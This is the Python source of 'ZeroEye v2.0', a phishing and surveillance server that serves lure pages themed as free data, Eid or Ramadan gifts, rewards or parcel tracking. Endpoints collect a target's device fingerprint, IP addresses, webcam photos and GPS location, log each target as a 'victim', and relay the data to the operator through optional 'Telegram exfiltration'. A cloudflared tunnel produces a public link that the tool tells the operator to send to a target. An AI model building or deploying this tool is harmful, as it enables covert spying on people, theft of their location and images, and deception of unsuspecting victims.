import os
import sys
import json
import time
import shutil
import atexit
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel
from rich.table import Table

from core.banner import get_banner
from core.bot import TelegramSender
from core.tunnel import TunnelManager

console = Console()
app = FastAPI(docs_url=None, redoc_url=None)
app.add_middleware(
    CORSMiddleware, 
    allow_origins=["*"], 
    allow_methods=["*"], 
    allow_headers=["*"]
)

# Ensure directories exist
if not os.path.exists("static"): os.makedirs("static")
if not os.path.exists("captured"): os.makedirs("captured")
if not os.path.exists("templates"): os.makedirs("templates")

app.mount("/static", StaticFiles(directory="static"), name="static")

CONFIG_FILE = "config.json"
CONFIG = {
    "telegram_enabled": False, 
    "bot_token": "", 
    "chat_id": "", 
    "template": "free_data"
}
bot = None
tunnel_manager = None

# --- CONFIG MANAGEMENT ---
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            console.print(f"[red][!] Error loading config: {e}[/red]")
            return None
    return None

def save_config(conf):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(conf, f, indent=2)
        return True
    except Exception as e:
        console.print(f"[red][!] Error saving config: {e}[/red]")
        return False

def delete_config():
    try:
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
            return True
    except:
        pass
    return False

def save_local(filename, data):
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(f"captured/{filename}", "a", encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"{'='*60}\n")
            f.write(f"{data}\n\n")
    except Exception as e:
        console.print(f"[red][!] Error saving local file: {e}[/red]")

def cleanup():
    """Cleanup function to stop tunnel on exit"""
    global tunnel_manager
    if tunnel_manager:
        tunnel_manager.stop_tunnel()

# Register cleanup function
atexit.register(cleanup)

# --- FASTAPI ROUTES ---
@app.get("/")
async def serve_index():
    path = f"templates/{CONFIG['template']}.html"
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f: 
            return HTMLResponse(f.read())
    return HTMLResponse("<h1>Error: Template not found</h1>")

@app.post("/upload_sys")
async def receive_sys(data: str = Form(...)):
    try:
        info = json.loads(data)
        
        table = Table(show_header=True, header_style="bold green")
        table.add_column("Category", style="cyan", width=20)
        table.add_column("Details", style="white")
        
        if 'basic' in info:
            basic = info['basic']
            table.add_row("📱 Device", f"{basic.get('platform', 'Unknown')}")
            table.add_row("🖥️ Screen", f"{basic['screen']['width']}x{basic['screen']['height']}")
            table.add_row("🌐 Timezone", basic['timezone']['name'])
        
        if 'fingerprint' in info:
            fp = info['fingerprint']
            table.add_row("🔍 Fingerprint", f"Canvas: Available | Fonts: {len(fp.get('fonts', []))}")
        
        console.print(Panel(table, title="🎯 [bold green]VICTIM CONNECTED[/bold green]", border_style="green"))
        
        if bot:
            telegram_msg = "🎯 *NEW VICTIM CONNECTED*\n\n"
            if 'basic' in info:
                basic = info['basic']
                telegram_msg += f"*Device:* {basic.get('platform', 'Unknown')}\n"
                telegram_msg += f"*Screen:* {basic['screen']['width']}x{basic['screen']['height']}\n"
                telegram_msg += f"*Timezone:* {basic['timezone']['name']}\n"
            
            bot.send_message(telegram_msg)
        
        save_local("victims.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
        
    except Exception as e:
        return {"status": "error"}

@app.post("/upload_ip")
async def receive_ip(data: str = Form(...)):
    try:
        info = json.loads(data)
        ips = info.get('ips', [])
        
        for ip in ips:
            console.print(f"[green][+] IP Leak: {ip}[/green]")
            
            if bot: 
                bot.send_message(f"🌐 *IP Leak*\n\n`{ip}`")
            
            save_local("ip_logs.txt", f"IP: {ip}")
        
        return {"status": "ok"}
        
    except Exception as e:
        return {"status": "error"}

@app.post("/upload_cam")
async def receive_cam(file: UploadFile = File(...)):
    try:
        filename = f"captured/cam_{int(time.time())}.jpg"
        with open(filename, "wb") as buffer: 
            shutil.copyfileobj(file.file, buffer)
        
        console.print(f"[green][+] Camera shot captured[/green]")
        
        if bot: 
            bot.send_photo(filename, caption="📸 *Camera Capture*")
            
        return {"status": "ok"}
        
    except Exception as e:
        return {"status": "error"}

@app.post("/upload_location")
async def receive_location(data: str = Form(...)):
    try:
        info = json.loads(data)
        
        if 'latitude' in info:
            console.print(Panel(
                f"[bold yellow]📍 LOCATION CAPTURED[/bold yellow]\n\n"
                f"[cyan]Latitude:[/cyan] {info['latitude']}\n"
                f"[cyan]Longitude:[/cyan] {info['longitude']}",
                title="Geolocation",
                border_style="yellow"
            ))
            
            if bot:
                bot.send_message(f"📍 *Location Data*\n\nLat: {info['latitude']}\nLon: {info['longitude']}")
        
        save_local("location.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
        
    except Exception as e:
        return {"status": "error"}

# Add other endpoints as needed...

# --- WIZARD INTERFACE ---
def start_wizard():
    console.clear()
    console.print(get_banner())
    
    # Config persistence
    saved_conf = load_config()
    global bot, CONFIG, tunnel_manager
    
    if saved_conf:
        console.print("\n[cyan]📁 Found saved configuration[/cyan]")
        
        choice = Prompt.ask(
            "Use saved settings?", 
            choices=["y", "n", "delete"], 
            default="y"
        )
        
        if choice == "y":
            CONFIG.update(saved_conf)
            if CONFIG["telegram_enabled"] and CONFIG["bot_token"] and CONFIG["chat_id"]:
                bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
        elif choice == "delete":
            delete_config()
            saved_conf = None
        else:
            saved_conf = None

    if not saved_conf:
        console.print("\n[bold yellow]🤖 Telegram Configuration[/bold yellow]")
        if Confirm.ask("Enable Telegram exfiltration?", default=True):
            CONFIG["telegram_enabled"] = True
            CONFIG["bot_token"] = Prompt.ask("Enter Bot Token")
            CONFIG["chat_id"] = Prompt.ask("Enter Chat ID")
            
            test_bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
            if Confirm.ask("Save these settings for future use?", default=True):
                save_config(CONFIG)
            
            bot = test_bot
        else:
            CONFIG["telegram_enabled"] = False

    # Template selection
    console.print("\n[bold cyan]🎨 Select Template[/bold cyan]")
    templates = {
        "1": ("🎁 Free Data", "free_data"),
        "2": ("🌙 Eid Gift", "eid"), 
        "3": ("🕌 Ramadan", "ramadan"),
        "4": ("🌍 Gulf Bundle", "gulf"),
        "5": ("🎁 Rewards", "rewards"),
        "6": ("📦 Tracking", "tracking")
    }
    
    for key, (name, _) in templates.items():
        console.print(f"  {key}. {name}")
    
    choice = Prompt.ask("Choose template", choices=list(templates.keys()), default="1")
    CONFIG["template"] = templates[choice][1]
    console.print(f"[green][✓] Selected: {templates[choice][0]}[/green]")

    # Start server and tunnel
    port = 8080
    console.print(f"\n[green][*] Starting server on port {port}...[/green]")
    
    # Initialize tunnel manager with auto-healing
    tunnel_manager = TunnelManager(port)
    
    console.print("[cyan][*] Establishing secure tunnel (auto-healing enabled)...[/cyan]")
    url = tunnel_manager.start_cloudflared()
    
    if url.startswith("Error:"):
        console.print(Panel(
            f"[bold red]❌ TUNNEL ERROR[/bold red]\n\n"
            f"[yellow]{url}[/yellow]\n\n"
            f"[cyan]Troubleshooting steps:[/cyan]\n"
            f"1. Check your internet connection\n"
            f"2. Ensure Cloudflare is not blocked\n"
            f"3. Try again in 2-3 minutes\n"
            f"4. Restart the tool",
            title="Connection Issue",
            border_style="red"
        ))
        return
    
    console.print(Panel(
        f"[bold cyan]🎯 ZEROEYE READY[/bold cyan]\n\n"
        f"[bold green]{url}[/bold green]\n\n"
        f"[yellow]📋 Send this link to your target[/yellow]\n"
        f"[green]✅ Auto-healing tunnel active[/green]\n"
        f"[grey50]💡 Tunnel will automatically recover from errors[/grey50]",
        title="ZeroEye v2.0 - Professional",
        border_style="green",
        expand=False
    ))
    
    console.print("\n[cyan]🛡️  Server running with auto-healing tunnel...[/cyan]")
    console.print("[yellow]📁 Data will be saved to: captured/ folder[/yellow]")
    
    try:
        uvicorn.run(app, host="0.0.0.0", port=port, log_level="error")
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Shutting down ZeroEye...[/yellow]")
    except Exception as e:
        console.print(f"[red][!] Server error: {e}[/red]")
    finally:
        cleanup()

if __name__ == "__main__":
    start_wizard()
